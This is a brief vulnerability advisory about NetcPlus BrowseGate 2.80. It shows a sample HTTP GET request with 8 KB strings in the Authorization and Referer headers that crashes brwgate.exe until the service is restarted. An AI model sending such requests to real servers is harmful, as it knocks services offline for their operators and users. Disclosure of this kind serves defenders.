NetcPlus BrowseGate 2.80 will crash as the result of an invalid read error if a number of character strings consisting of 8 KB are inserted into GET request arguments through port 80.

For example:

GET / HTTP/1.0<cr>
Authorization: Basic(8 KB string of characters)<cr>
From: email@address.com<cr>
If-Modified-Since: Sat, 29 Oct 1994 19:43:31 GMT<cr>
Referer: http://referrer/(8 KB string of characters)<cr>
UserAgent: Browser 1.1<cr>
<cr><cr>

will cause brwgate.exe to fail and a restart of the service is required in order to gain normal functionality.
